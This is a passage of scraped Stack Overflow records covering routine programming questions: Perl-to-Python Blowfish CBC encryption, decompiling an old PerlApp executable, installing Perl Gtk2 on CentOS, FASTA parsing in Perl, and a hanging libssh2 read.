"https://stackoverflow.com/questions/33620584/problems-with-encryption-when-converting-cryptcbc-example-from-perl-to-python/33681844#33681844", "title": "Problems with encryption when converting Crypt:CBC example from Perl to Python (Blowfish)", "body": "<p>I guess you are not supposed to answer your own question, but i leave it here anyway:)\nI think maybe padding was off in the original code, not really sure.\nThis time i used the nice \"Padding\" lib <a href=\"https://pypi.python.org/pypi/Padding\" rel=\"nofollow\">https://pypi.python.org/pypi/Padding</a> </p>\n\n<pre><code>from Crypto.Cipher import Blowfish\nfrom binascii import hexlify, unhexlify\nimport Padding \n\nclass BlowFishCipher:\n    def __init__( self, key,iv,salt ):\n    self.key = unhexlify(key)\n    self.iv = unhexlify(iv)\n    self.salt = unhexlify(salt)\ndef encrypt( self, raw ):\n    raw = Padding.appendPadding(raw, BS)\n    cipher = Blowfish.new( self.key, Blowfish.MODE_CBC, self.iv )\n    return hexlify(\"Salted__\"+self.salt+cipher.encrypt(raw))\ndef decrypt( self, enc):\n    enc = unhexlify(enc)\n    cipher = Blowfish.new(self.key, Blowfish.MODE_CBC, self.iv )\n    return Padding.removePadding(cipher.decrypt( enc), BS)\n\nif __name__== \"__main__\":\n    BS = Blowfish.block_size\n    key_perl = \"031f2cc96d063cf836ce42c77a8a3d25bdd959659d00a892a02b13930e92f47c82a7054256be4a0f1b3771bd36c07fe3ea4f6900f8ddebe5\"\n    iv_perl = \"f4d50b2385a2a996\"\n    salt_perl= \"3132333431323334\"\n    passphrase_perl = \"53616c7465645f5f31323334313233344c0ad60f0eb9fdffc46b5cc02d76d473\"\n    # remove \"Salted__12341234\" from passhphrase_perl by [32:]  \n    passphrase = passphrase_perl[32:]\n    decryptor = BlowFishCipher(key_perl,iv_perl,salt_perl)\n    plaintext = decryptor.decrypt(passphrase)\n    print \"decrypted        {:&gt;70}\".format(plaintext)\n    ciphertext = \"secret text\"\n    encodedtext = decryptor.encrypt(ciphertext)\n    print \"encrypted pyhton {:&gt;70}\".format(encodedtext)\n    print \"encrypted perl   {:&gt;70}\".format(passphrase_perl)\n</code></pre>\n\n<p>decrypted                                                            secret text</p>\n\n<p>encrypted pyhton       53616c7465645f5f31323334313233344c0ad60f0eb9fdffc46b5cc02d76d473</p>\n\n<p>encrypted perl         53616c7465645f5f31323334313233344c0ad60f0eb9fdffc46b5cc02d76d473</p>\n"}], "owner": {"reputation": 35, "user_id": 5540257, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/51a26e8fe52c02bfbd16aef7e5071a87?s=128&d=identicon&r=PG&f=1", "display_name": "G&#246;ran Str&#246;m", "link": "https://stackoverflow.com/users/5540257/g%c3%b6ran-str%c3%b6m"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 543, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1447364081, "creation_date": 1447113577, "last_edit_date": 1447312721, "question_id": 33620584, "link": "https://stackoverflow.com/questions/33620584/problems-with-encryption-when-converting-cryptcbc-example-from-perl-to-python", "title": "Problems with encryption when converting Crypt:CBC example from Perl to Python (Blowfish)", "body": "<p>I am trying to translate the program below to Python. \nIn the end the Python code should produce the same passphrase output as the Perl variant.</p>\n\n<pre><code>#!/usr/bin/env perl\nuse Crypt::CBC;\n\nmy $key = 'key to the gates'; \nmy $cipher = Crypt::CBC-&gt;new(\n    -key    =&gt; $key,\n    -cipher =&gt; 'Blowfish',\n    -salt =&gt; '12341234'  \n);\nmy $pass_phrase = \"secret text\";\nprint $cipher-&gt;encrypt_hex($pass_phrase),\"\\n\";\nprint unpack('H*', $cipher-&gt;key()), \"\\n\";\nprint unpack('H*', $cipher-&gt;iv()), \"\\n\";\nprint unpack('H*', $cipher-&gt;salt()), \"\\n\";\nprint unpack('H*', $cipher-&gt;keysize()), \"\\n\";\n\n#output:\n#pass:53616c7465645f5f31323334313233344c0ad60f0eb9fdffc46b5cc02d76d473 &lt;- hex enc \"Salted__12341234&lt;gibberish&gt;\"\n#key:031f2cc96d063cf836ce42c77a8a3d25bdd959659d00a892a02b13930e92f47c82a7054256be4a0f1b3771bd36c07fe3ea4f6900f8ddebe5\n#iv:f4d50b2385a2a996\n#salt:3132333431323334\n#keysize:3536\n</code></pre>\n\n<p>Below is my python code than that decrypts successfully, but encrypts unsuccessfully.\nThe successfull decryption of the perl passphrase was mostly for verify input params. (Taking IV straight from perl and removing Crypt::CBC's added 16 char of salt before decrypting made it work, various posts on SO helped me..).</p>\n\n<p>Then is the unsuccessful attempt to encryption passhphrase and generate the same output as perl.\nI think i just need to use the right combination of the verified input params to get it working...maybe the salt should be padded? Or padding in general is wrong? Or iv input should not be hexlified? (it need to be 8 chars..)</p>\n\n<p>Any input is appreciated!</p>\n\n<pre><code>!/usr/bin/env python\nfrom Crypto.Cipher import Blowfish\nfrom binascii import hexlify, unhexlify\nfrom struct import pack\nimport base64\n\n# working decryption\npassphrase =  unhexlify(\"53616c7465645f5f31323334313233344c0ad60f0eb9fdffc46b5cc02d76d473\"[32:])\nkey = unhexlify(\"031f2cc96d063cf836ce42c77a8a3d25bdd959659d00a892a02b13930e92f47c82a7054256be4a0f1b3771bd36c07fe3ea4f6900f8ddebe5\")\niv  = unhexlify('f4d50b2385a2a996')\nnum_padding = ord(Blowfish.new(key, Blowfish.MODE_CBC, iv).decrypt(passphrase)[-1])\nprint Blowfish.new(key, Blowfish.MODE_CBC, iv).decrypt(passphrase)[:(-1*num_padding)]\n\n# --- non working encryption!\npassphrase2 = \"secret text\"\nkey2 = 'key to the gates'\niv2  = unhexlify('f4d50b2385a2a996')\nplength = Blowfish.block_size - len(passphrase2) % Blowfish.block_size\npadding = [plength] * plength\npad_str = passphrase2 + pack('b' * plength, *padding)\ncipher = Blowfish.new(key2, Blowfish.MODE_CBC, iv2)\nprint hexlify(\"Salted__12341234\"+cipher.encrypt(pad_str))\n\n#output:\n#secret text\n#53616c7465645f5f31323334313233346aa3f2169677cbf282b1330b46da3114\n</code></pre>\n"}, {"tags": ["perl", "perl-module", "decompiler", "activestate", "perlapp"], "comments": [{"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 2, "creation_date": 1447112057, "post_id": 33620125, "comment_id": 55015102, "body": "If it&#39;s anything like the standalone executables PAR::Packer generates, it&#39;s not actually compiled---just bundled. Try extracting the file with an unzip utility."}, {"owner": {"reputation": 37, "user_id": 4640503, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/20LSV.jpg?s=128&g=1", "display_name": "Bies", "link": "https://stackoverflow.com/users/4640503/bies"}, "reply_to_user": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1447121079, "post_id": 33620125, "comment_id": 55017741, "body": "no, unfortunately it is an exe and it is not just compressed :("}, {"owner": {"reputation": 2797, "user_id": 4123698, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/883acd9ee061b3a325ba22b1fee3daca?s=128&d=identicon&r=PG&f=1", "display_name": "harvey", "link": "https://stackoverflow.com/users/4123698/harvey"}, "edited": false, "score": 0, "creation_date": 1447121889, "post_id": 33620125, "comment_id": 55017939, "body": "Some people had success with this process; <a href=\"http://www.perlmonks.org/?node=A%20real%20challenge\" rel=\"nofollow noreferrer\">perlmonks.org/?node=A%20real%20challenge</a>"}], "owner": {"reputation": 37, "user_id": 4640503, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/20LSV.jpg?s=128&g=1", "display_name": "Bies", "link": "https://stackoverflow.com/users/4640503/bies"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 973, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1447110910, "creation_date": 1447110910, "question_id": 33620125, "link": "https://stackoverflow.com/questions/33620125/decompile-a-perlapp-exe-from-ten-years-ago", "title": "Decompile a PerlApp Exe from ten years ago", "body": "<p>I am asking something a little obsolete. I retrieved one of my project written back more than 10 years ago, when I was a student, but unfortunately I could only retrieve the executable.\nI am trying to decompile it, but I really cannot recall the Perl version at the time, I remember only that I used PerlApp, and Perl was ActiveState Perl.\nIf you want, no problem updating the 500 kb executable, I am not gelous of my kid-me-work, I just whish I could see how moron of a programmer I was :)</p>\n\n<p>Thanks in advance</p>\n\n<p>Matteo</p>\n"}, {"tags": ["linux", "perl", "gtk", "centos7"], "answers": [{"comments": [{"owner": {"reputation": 115, "user_id": 4541405, "user_type": "registered", "accept_rate": 29, "profile_image": "https://www.gravatar.com/avatar/6c209cd112b711cb948298038e0e5cb8?s=128&d=identicon&r=PG&f=1", "display_name": "rhg_lnx", "link": "https://stackoverflow.com/users/4541405/rhg-lnx"}, "edited": false, "score": 0, "creation_date": 1447103706, "post_id": 33615646, "comment_id": 55011243, "body": "I tried these and saw the following.  Am I missing something?  sudo yum install perl-Gtk2 Loaded plugins: fastestmirror, langpacks Loading mirror speeds from cached hostfile  * base: mirror.sesp.northwestern.edu  * extras: repos.lax.quadranet.com  * updates: mirror.chpc.utah.edu No package perl-Gtk2 available. Error: Nothing to do   sudo yum provides */Gtk2.pm Loaded plugins: fastestmirror, langpacks Loading mirror speeds from cached hostfile  * base: mirror-centos.hostingswift.com  * extras: repos.lax.quadranet.com  * updates: centos.sonn.com No matches found"}], "tags": [], "owner": {"reputation": 4790, "user_id": 4491743, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/aXCqO.jpg?s=128&g=1", "display_name": "Knud Larsen", "link": "https://stackoverflow.com/users/4491743/knud-larsen"}, "is_accepted": false, "score": 3, "last_activity_date": 1447095184, "last_edit_date": 1447095184, "creation_date": 1447093354, "answer_id": 33615646, "question_id": 33614888, "link": "https://stackoverflow.com/questions/33614888/running-perl-5-on-centos-7-and-trying-to-install-abd-use-gtk-gtk2/33615646#33615646", "title": "Running Perl 5 on Centos 7 and trying to install abd use gtk / gtk2", "body": "<hr>\n\n<p>\u00bb\u00bb <code>use Gtk;</code> \u00ab\u00ab : Better \u2192 <code>use Gtk2;</code></p>\n\n<p>Gtk.pm is for the ancient gtk+ -1.2.10 : Year 2002? No CentOS 7 packages, perl-Gtk.</p>\n\n<p>Please do : # yum install perl-Gtk2</p>\n\n<p>Provides /usr/lib64/perl5/vendor_perl/Gtk2.pm</p>\n\n<hr>\n\n<p>Generally : Please use the 'yum provides */[file]' command to decide package names : </p>\n\n<p>Like <code># yum provides */Gtk2.pm</code></p>\n\n<hr>\n\n<p><a href=\"/questions/tagged/gtk2.pm\" class=\"post-tag\" title=\"show questions tagged &#39;gtk2.pm&#39;\" rel=\"tag\">gtk2.pm</a></p>\n\n<hr>\n"}, {"tags": [], "owner": {"reputation": 4790, "user_id": 4491743, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/aXCqO.jpg?s=128&g=1", "display_name": "Knud Larsen", "link": "https://stackoverflow.com/users/4491743/knud-larsen"}, "is_accepted": false, "score": 3, "last_activity_date": 1447107685, "creation_date": 1447107685, "answer_id": 33619406, "question_id": 33614888, "link": "https://stackoverflow.com/questions/33614888/running-perl-5-on-centos-7-and-trying-to-install-abd-use-gtk-gtk2/33619406#33619406", "title": "Running Perl 5 on Centos 7 and trying to install abd use gtk / gtk2", "body": "<hr>\n\n<p>Right, a lot of the common packages are in the epel.repo : Extra Packages for Enterprise Linux (EPEL) <a href=\"https://fedoraproject.org/wiki/EPEL\" rel=\"nofollow\">https://fedoraproject.org/wiki/EPEL</a></p>\n\n<p>Download 'epel-release-7-5.noarch.rpm' <a href=\"https://dl.fedoraproject.org/pub/epel/7/x86_64/e/epel-release-7-5.noarch.rpm\" rel=\"nofollow\">https://dl.fedoraproject.org/pub/epel/7/x86_64/e/epel-release-7-5.noarch.rpm</a></p>\n\n<p>And install with <code># cd Downloads/ &amp;&amp; yum install epel-release-7-5.noarch.rpm</code></p>\n\n<hr>\n\n<p><a href=\"/questions/tagged/epel\" class=\"post-tag\" title=\"show questions tagged &#39;epel&#39;\" rel=\"tag\">epel</a></p>\n"}], "owner": {"reputation": 115, "user_id": 4541405, "user_type": "registered", "accept_rate": 29, "profile_image": "https://www.gravatar.com/avatar/6c209cd112b711cb948298038e0e5cb8?s=128&d=identicon&r=PG&f=1", "display_name": "rhg_lnx", "link": "https://stackoverflow.com/users/4541405/rhg-lnx"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1173, "favorite_count": 0, "answer_count": 2, "score": 1, "last_activity_date": 1447107685, "creation_date": 1447090760, "last_edit_date": 1447090784, "question_id": 33614888, "link": "https://stackoverflow.com/questions/33614888/running-perl-5-on-centos-7-and-trying-to-install-abd-use-gtk-gtk2", "title": "Running Perl 5 on Centos 7 and trying to install abd use gtk / gtk2", "body": "<p>Someone may notice this is an almost identical question I posted a few days ago regarding tcl / tk.  The original recommendation (that worked for this particular error) does not seem to remedy the same error condition that I am currently seeing when attempting to use gtk / gtk2.  </p>\n\n<p>I have attempted to switch from tk to gtk because there were subsequent problems with tk that I simply wasn't been able to resolve.</p>\n\n<p>In case it is important, all I am trying to do is Use a GUI from a Perl script.</p>\n\n<p>The remedy for the tk problem was to install tk-devel using yum.</p>\n\n<p>I'm not finding a gtk-devel package, But I did find this on the net, which I did.</p>\n\n<pre><code>sudo yum install gtk* gtk+*\n</code></pre>\n\n<p>I have also update my perl installation to the current level via yum.</p>\n\n<p>Anyway, when I invoke my test script which has one line in the form of </p>\n\n<pre><code>use Gtk;\n</code></pre>\n\n<p>or gtk, Gtk2, gtk2 I see the error </p>\n\n<blockquote>\n  <p>Can't locate Gtk.pm in @Inc (file list...)</p>\n</blockquote>\n\n<p>I am not sure why the original tk issue was fixed by the inclusion of tk-devel and why I have been unable to do the same with the gtk package?  Or maybe there is an additional issue involved?</p>\n"}, {"tags": ["perl", "sequence", "fasta"], "comments": [{"owner": {"reputation": 339644, "user_id": 118068, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/077db5466d3b58e7bbbd498dca173f04?s=128&d=identicon&r=PG", "display_name": "Marc B", "link": "https://stackoverflow.com/users/118068/marc-b"}, "edited": false, "score": 3, "creation_date": 1447090260, "post_id": 33614706, "comment_id": 55003750, "body": "why parse it yourself? <a href=\"http://search.cpan.org/dist/BioPerl/Bio/DB/Fasta.pm\" rel=\"nofollow noreferrer\">search.cpan.org/dist/BioPerl/Bio/DB/Fasta.pm</a>"}], "answers": [{"comments": [{"owner": {"reputation": 97, "user_id": 5068162, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/a27e38bced150581afa61861fdccbeda?s=128&d=identicon&r=PG&f=1", "display_name": "Elle", "link": "https://stackoverflow.com/users/5068162/elle"}, "edited": false, "score": 0, "creation_date": 1447091975, "post_id": 33615240, "comment_id": 55004709, "body": "Thank you, that makes sense. What would be the best way to make sure the default printing doesn&#39;t include what is in the header and only includes the actual sequence after the header?"}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "reply_to_user": {"reputation": 97, "user_id": 5068162, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/a27e38bced150581afa61861fdccbeda?s=128&d=identicon&r=PG&f=1", "display_name": "Elle", "link": "https://stackoverflow.com/users/5068162/elle"}, "edited": false, "score": 0, "creation_date": 1447092075, "post_id": 33615240, "comment_id": 55004774, "body": "Er. Depends which bit is the &quot;header&quot; you refer to. But you can do e.g. <code>next if m&#47;&gt;&#47;</code> to skip lines that contain a <code>&gt;</code>"}, {"owner": {"reputation": 97, "user_id": 5068162, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/a27e38bced150581afa61861fdccbeda?s=128&d=identicon&r=PG&f=1", "display_name": "Elle", "link": "https://stackoverflow.com/users/5068162/elle"}, "edited": false, "score": 0, "creation_date": 1447092395, "post_id": 33615240, "comment_id": 55004950, "body": "Oh wow, thanks for your suggestions! I can see where this would work. To format the fasta file properly to include <code>&gt;</code> before the species name and print on the next line, I can just add \\n to the <code>print OUT $_</code> statement yes?"}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "reply_to_user": {"reputation": 97, "user_id": 5068162, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/a27e38bced150581afa61861fdccbeda?s=128&d=identicon&r=PG&f=1", "display_name": "Elle", "link": "https://stackoverflow.com/users/5068162/elle"}, "edited": false, "score": 0, "creation_date": 1447092522, "post_id": 33615240, "comment_id": 55005022, "body": "Yes. Or just don&#39;t <code>chomp</code> the line in the first place, and it&#39;ll keep it&#39;s linefeed."}], "tags": [], "owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "is_accepted": true, "score": 2, "last_activity_date": 1447091976, "last_edit_date": 1447091976, "creation_date": 1447091862, "answer_id": 33615240, "question_id": 33614706, "link": "https://stackoverflow.com/questions/33614706/adding-sequence-from-fasta-file-using-perl/33615240#33615240", "title": "Adding sequence from FASTA file using Perl", "body": "<p>That's because what this does:</p>\n\n<pre><code>if ( $_ =~ /\\[([^]]+)\\]/ ) {\n        print OUT \"$1\\n\";\n}\n</code></pre>\n\n<p>Is find and capture any text in <code>[]</code>. But if that pattern <em>doesn't</em> match, you don't do anything else with the line - like print it. </p>\n\n<p>Adding:</p>\n\n<pre><code>else {\n    print OUT $_;\n}\n</code></pre>\n\n<p>Will mean if a line <em>doesn't</em> contain <code>[]</code> it'll get printed by default. </p>\n\n<p>I will also suggest:</p>\n\n<ul>\n<li>turn on <code>use strict;</code>.</li>\n<li>lexical filehandles are good practice: <code>open ( my $input, '&lt;', $file ) or die $!;</code> </li>\n<li>a pattern match implicitly applies to <code>$_</code> by default. So you can write that 'if' as <code>if ( /\\[([^]]+)\\]/ )</code></li>\n</ul>\n"}, {"tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 0, "last_activity_date": 1447140180, "creation_date": 1447140180, "answer_id": 33624762, "question_id": 33614706, "link": "https://stackoverflow.com/questions/33614706/adding-sequence-from-fasta-file-using-perl/33624762#33624762", "title": "Adding sequence from FASTA file using Perl", "body": "<p>A couple of general points about your program</p>\n\n<ul>\n<li><p>You <em>must always</em> <code>use strict</code> as well as <code>use warnings 'all'</code> at the top of every Perl program you write. It will reveal many simple mistakes that you could otherwise easily overlook</p></li>\n<li><p>You have done well to choose the three-parameter form of <code>open</code>, but you should also use lexical file handles. So this line</p></li>\n</ul>\n\n<pre class=\"lang-perl prettyprint-override\"><code>    open(OUT, '&gt;', $tmp) or die \"Can't open $tmp: $!\";\n\nshould be written as\n</code></pre>\n\n<pre class=\"lang-perl prettyprint-override\"><code>    open my $out_fh, '&gt;', $tmp or die \"Can't open $tmp: $!\";\n</code></pre>\n\n<ul>\n<li>It's probably best to supply the input and output file names on the command line, so you don't have to edit your program to run it against different files</li>\n</ul>\n\n<p>I would solve your problem like this. It checks to see if each line is a header that contains a string enclosed in square brackets. The first test is that the line starts with a close angle bracket <code>&gt;</code>,  and the second test is the same as you wrote in your own program that captures the bracketed string \u2014 the species name</p>\n\n<p>If these checks are passed then the species name is printed with an closing angle bracket and a newline, otherwise the line is printed as it is</p>\n\n<p>This program should be run like this</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>$ fasta_species.pl seqs.fasta &gt; newseqs.fasta\n</code></pre>\n\n<p>The dollar is just the Linux prompt character, and it assumes you have put the program in a file names <code>fasta_species.pl</code>. You can omit the <code>&gt; newseqs.fasta</code> to display the output directly to the screen so that you can see what is being produced without creating an output file and editing it</p>\n\n<pre class=\"lang-perl prettyprint-override\"><code>use strict;\nuse warnings 'all';\n\nwhile ( &lt;&gt; ) {\n    if ( /^&gt;/ and / \\[ ( [^\\[\\]]+ ) \\] /x ) {\n        print \"&gt;$1\\n\";\n    }\n    else {\n        print;\n    }\n}\n</code></pre>\n\n<h3>output</h3>\n\n<pre class=\"lang-none prettyprint-override\"><code>&gt;Arabidopsis thaliana\nMKIRNSPSFHGGSGYSVFRARNLTFKKVVKKVMRDQSNNQFMIQMENMIRRIVREEIQRSLQPFLSSSCVSMERSRSETP\nSSRSRLKLCFINSPPSSIFTGSKIEAEDGSPLVIELVDATTNTLVSTGPFSSSRVELVPLNADFTEESWTVEGFNRNILT\nQREGKRPLLTGDLTVMLKNGVGVITGDIAFSDNSSWTRSRKFRLGAKLTGDGAVEARSEAFGCRDQRGESYKKHHPPCPS\nDEVWRLEKIAKDGVSATRLAERKILTVKDFRRLYTIIGAGVSKKTWNTIVSHAMDCVLDETECYIYNANTPGVTLLFNSV\nYELIRVSFNGNDIQNLDQPILDQLKAEAYQNLNRITAVNDRTFVGHPQRSLQCPQDPGFVVTCSGSQHIDFQGSLDPSSS\nSMALCHKASSSTVHPDVLMSFDNSSTARFHIDKKFLPTFGNSFKVSELDQVHGKSQTVVTKGCIENNEEDENAFSYHHHD\nDMTSSWSPGTHQAVETMFLTVSETEEAGMFDVHFANVNLGSPRARWCKVKAAFKVRAAFKEVRRHTTARNPREGL\n</code></pre>\n"}], "owner": {"reputation": 97, "user_id": 5068162, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/a27e38bced150581afa61861fdccbeda?s=128&d=identicon&r=PG&f=1", "display_name": "Elle", "link": "https://stackoverflow.com/users/5068162/elle"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 163, "favorite_count": 1, "accepted_answer_id": 33615240, "answer_count": 2, "score": -2, "last_activity_date": 1447140180, "creation_date": 1447090114, "last_edit_date": 1447139400, "question_id": 33614706, "link": "https://stackoverflow.com/questions/33614706/adding-sequence-from-fasta-file-using-perl", "title": "Adding sequence from FASTA file using Perl", "body": "<p>I'm still learning Perl and I have a program which is able to take a FASTA file sequence header and print only the species name within square brackets. I want to add to this code to have it also print the entire sequence associated with the species.</p>\n\n<p>Here is my code:</p>\n\n<pre class=\"lang-perl prettyprint-override\"><code>#!/usr/bin/perl\nuse warnings;\n\nmy $file = 'seqs.fasta';\nmy $tmp = 'newseqs.fasta';\nopen(OUT, '&gt;', $tmp) or die \"Can't open $tmp: $!\";\nopen(IN, '&lt;', $file) or die \"Can't open $file: $!\";\n\nwhile(&lt;IN&gt;) {\n    chomp;\n    if ( $_ =~ /\\[([^]]+)\\]/ ) {\n        print OUT \"$1\\n\";\n    }\n}\n\nclose(IN);\nclose(OUT);\n</code></pre>\n\n<p>Here is a sample of the original FASTA file I had:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>&gt;gi|334187971|ref|NP_001190408.1| Cam-binding protein 60-like G [Arabidopsis thaliana] &gt;gi|332006244|gb|AED93627.1| Cam-binding protein 60-like G [Arabidopsis thaliana]\nMKIRNSPSFHGGSGYSVFRARNLTFKKVVKKVMRDQSNNQFMIQMENMIRRIVREEIQRSLQPFLSSSCVSMERSRSETP\nSSRSRLKLCFINSPPSSIFTGSKIEAEDGSPLVIELVDATTNTLVSTGPFSSSRVELVPLNADFTEESWTVEGFNRNILT\nQREGKRPLLTGDLTVMLKNGVGVITGDIAFSDNSSWTRSRKFRLGAKLTGDGAVEARSEAFGCRDQRGESYKKHHPPCPS\nDEVWRLEKIAKDGVSATRLAERKILTVKDFRRLYTIIGAGVSKKTWNTIVSHAMDCVLDETECYIYNANTPGVTLLFNSV\nYELIRVSFNGNDIQNLDQPILDQLKAEAYQNLNRITAVNDRTFVGHPQRSLQCPQDPGFVVTCSGSQHIDFQGSLDPSSS\nSMALCHKASSSTVHPDVLMSFDNSSTARFHIDKKFLPTFGNSFKVSELDQVHGKSQTVVTKGCIENNEEDENAFSYHHHD\nDMTSSWSPGTHQAVETMFLTVSETEEAGMFDVHFANVNLGSPRARWCKVKAAFKVRAAFKEVRRHTTARNPREGL\n</code></pre>\n\n<p>Currently, the output only pulls the species name <em>Arabidopsis thaliana</em></p>\n\n<p>However, I want it to print properly in a fasta file as such:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>&gt;Arabidopsis thaliana\nMKIRNSPSFHGGSGYSVFRARNLTFKKVVKKVMRDQSNNQFMIQMENMIRRIVREEIQRSLQPFLSSSCVSMERSRSETP\nSSRSRLKLCFINSPPSSIFTGSKIEAEDGSPLVIELVDATTNTLVSTGPFSSSRVELVPLNADFTEESWTVEGFNRNILT\nQREGKRPLLTGDLTVMLKNGVGVITGDIAFSDNSSWTRSRKFRLGAKLTGDGAVEARSEAFGCRDQRGESYKKHHPPCPS\nDEVWRLEKIAKDGVSATRLAERKILTVKDFRRLYTIIGAGVSKKTWNTIVSHAMDCVLDETECYIYNANTPGVTLLFNSV\nYELIRVSFNGNDIQNLDQPILDQLKAEAYQNLNRITAVNDRTFVGHPQRSLQCPQDPGFVVTCSGSQHIDFQGSLDPSSS\nSMALCHKASSSTVHPDVLMSFDNSSTARFHIDKKFLPTFGNSFKVSELDQVHGKSQTVVTKGCIENNEEDENAFSYHHHD\nDMTSSWSPGTHQAVETMFLTVSETEEAGMFDVHFANVNLGSPRARWCKVKAAFKVRAAFKEVRRHTTARNPREGL\n</code></pre>\n\n<p>Could you suggest ways to modify the code to achieve this?</p>\n"}, {"tags": ["c", "perl", "ssh", "libssh2"], "comments": [{"owner": {"reputation": 9262, "user_id": 124951, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/c46d5911a8fb4ffd5fb8523d56a60de0?s=128&d=identicon&r=PG", "display_name": "salva", "link": "https://stackoverflow.com/users/124951/salva"}, "edited": false, "score": 0, "creation_date": 1447328813, "post_id": 33613972, "comment_id": 55114259, "body": "Unless you post the related parts of your code, including how session and channels objects are created and manipulated it is impossible to help you."}, {"owner": {"reputation": 77, "user_id": 1798831, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c229a08f64f580cb48fa0117a7e0c4a4?s=128&d=identicon&r=PG", "display_name": "Azryel", "link": "https://stackoverflow.com/users/1798831/azryel"}, "reply_to_user": {"reputation": 9262, "user_id": 124951, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/c46d5911a8fb4ffd5fb8523d56a60de0?s=128&d=identicon&r=PG", "display_name": "salva", "link": "https://stackoverflow.com/users/124951/salva"}, "edited": false, "score": 0, "creation_date": 1447679266, "post_id": 33613972, "comment_id": 55240579, "body": "I added the ssh connection part of the code (I don&#39;t think it will help but it might get clearer). I&#39;ve read that libssh2 is not thread safe, so maybe that&#39;s my problem ? I used Net::OpenSSH as a replacement and it works fine, but i like Net::SSH2 more, so if there is any possibility to make it work with Net::SSH2, i&#39;m listening =)"}, {"owner": {"reputation": 9262, "user_id": 124951, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/c46d5911a8fb4ffd5fb8523d56a60de0?s=128&d=identicon&r=PG", "display_name": "salva", "link": "https://stackoverflow.com/users/124951/salva"}, "edited": false, "score": 0, "creation_date": 1447682623, "post_id": 33613972, "comment_id": 55242730, "body": "What are you passing as <code>$command</code> exactly? <code>uptime</code>? your code will block if too much data comes through <code>stderr</code>. Include also the code initializing the Net::SSH2 session and establishing the connection. Can you reproduce the issue if you do the calls in sequence from just one thread?"}, {"owner": {"reputation": 9262, "user_id": 124951, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/c46d5911a8fb4ffd5fb8523d56a60de0?s=128&d=identicon&r=PG", "display_name": "salva", "link": "https://stackoverflow.com/users/124951/salva"}, "edited": false, "score": 0, "creation_date": 1447682828, "post_id": 33613972, "comment_id": 55242849, "body": "Also, include the versions of Net::SSH2 and libssh2. You could also enable debugging for libssh2: <code>$ssh2-&gt;debug(1)</code> (but that needs a libssh2 compiled with debugging support)."}], "owner": {"reputation": 77, "user_id": 1798831, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c229a08f64f580cb48fa0117a7e0c4a4?s=128&d=identicon&r=PG", "display_name": "Azryel", "link": "https://stackoverflow.com/users/1798831/azryel"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 687, "favorite_count": 1, "answer_count": 0, "score": 1, "last_activity_date": 1447679198, "creation_date": 1447087499, "last_edit_date": 1447679198, "question_id": 33613972, "link": "https://stackoverflow.com/questions/33613972/libssh2-channel-read-is-hanging", "title": "libssh2 - channel read is hanging", "body": "<p>I'm currently developing a remote job scheduler on perl.\nIt has to connect via ssh to x servers and execute already defined jobs/jobs groups.</p>\n\n<p>I use Net:SSH2 which is build upon libssh2.</p>\n\n<p>My program usually works fine with like 400/500 servers, but when i try to run the basic <code>uptime</code> command on 1000 servers, one or more of my threads hangs and never finishes, or like 30 minutes after.</p>\n\n<p>It's random : 